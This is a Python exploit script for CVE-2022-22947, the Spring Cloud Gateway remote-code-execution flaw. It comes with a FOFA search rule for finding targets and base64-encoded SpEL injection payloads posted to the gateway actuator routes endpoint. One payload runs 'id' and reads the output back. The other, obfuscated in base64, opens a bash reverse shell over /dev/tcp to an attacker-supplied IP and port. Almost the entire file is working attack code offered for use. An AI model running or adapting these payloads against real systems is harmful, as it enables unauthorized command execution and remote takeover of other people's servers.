#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import random
import base64
import re

from Config.config_proxies import proxies
from Config.config_requests import ua


requests.packages.urllib3.disable_warnings()

# 脚本信息
######################################################
NAME = 'CVE-2022-22947'
AUTHOR = "境心"
REMARK = 'Spring Cloud Gateway RCE'
FOFA_RULE = 'icon_hash="116323821"'
######################################################

def generate_random_str(randomlength=5):
    random_str = ''
    base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz'
    length = len(base_str) - 1
    for i in range(randomlength):
        random_str += base_str[random.randint(0, length)]
    return random_str

def poc(target,rem_ip="127.0.0.1",rem_port="80"):
    result = {}
    str_code = generate_random_str()
    if target[-1] == "/":
        target = target.strip("/")
    url13 = target + "/actuator/gateway/routes/" + str_code
    url2 = target + "/actuator/gateway/refresh"
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': ua,
        'Connection': 'close',
        'Content-Type': 'application/json'
    }
    poc_data = "eyAiaWQiOiAiYWExMTIyMzMiLCAiZmlsdGVycyI6IFt7ICJuYW1lIjogIkFkZFJlc3BvbnNlSGVhZGVyIiwgImFyZ3MiOiB7ICJuYW1lIjogIlJlc3VsdCIsICJ2YWx1ZSI6ICIje25ldyBTdHJpbmcoVChvcmcuc3ByaW5nZnJhbWV3b3JrLnV0aWwuU3RyZWFtVXRpbHMpLmNvcHlUb0J5dGVBcnJheShUKGphdmEubGFuZy5SdW50aW1lKS5nZXRSdW50aW1lKCkuZXhlYyhuZXcgU3RyaW5nW117XCJpZFwifSkuZ2V0SW5wdXRTdHJlYW0oKSkpfSIgfSB9XSwgInVyaSI6ICJodHRwOi8vZXhhbXBsZS5jb20iIH0="
    exp_data = "eyAiaWQiOiAiYWExMTIyMzMiLCAiZmlsdGVycyI6IFt7ICJuYW1lIjogIkFkZFJlc3BvbnNlSGVhZGVyIiwgImFyZ3MiOiB7ICJuYW1lIjogIlJlc3VsdCIsICJ2YWx1ZSI6ICIje25ldyBTdHJpbmcoVChvcmcuc3ByaW5nZnJhbWV3b3JrLnV0aWwuU3RyZWFtVXRpbHMpLmNvcHlUb0J5dGVBcnJheShUKGphdmEubGFuZy5SdW50aW1lKS5nZXRSdW50aW1lKCkuZXhlYyhuZXcgU3RyaW5nW117XCIvYmluL2Jhc2hcIixcIi1jXCIsXCJiYXNoIC1pID4mIC9kZXYvdGNwL3JlbV9pcC9yZW1fcG9ydCAwPiYxXCJ9KS5nZXRJbnB1dFN0cmVhbSgpKSl9IiB9IH1dLCAidXJpIjogImh0dHA6Ly9leGFtcGxlLmNvbSIgfQ=="

    if rem_ip =="127.0.0.1":
        a = requests.post(url13, headers=headers,data=base64.b64decode(poc_data).decode().replace('aa112233', str_code), verify=False, timeout=5,proxies=proxies)
    else:
        requests.post(url13, headers=headers,data=base64.b64decode(exp_data).decode().replace('rem_ip', rem_ip).replace('rem_port',rem_port).replace('aa112233', str_code), verify=False, timeout=5,proxies=proxies)

    requests.post(url2, headers=headers, verify=False, timeout=5,proxies=proxies)
    res = requests.get(url13, headers=headers, verify=False, timeout=5,proxies=proxies)
    try:
        res1 = re.findall("Result = '(.*)'", res.text)[0]
    except:
        pass
    else:
        result['vurl'] = url13
        result['poc'] = NAME
        result['command_res'] = res1
        result['message'] = "存在Spring Cloud Gateway RCE漏洞"
        return result

if __name__ == '__main__':
    poc("http://127.0.0.1")
    # exp单独调用方式
    # poc("https://27.0.0.1","vpsip","vpsport")
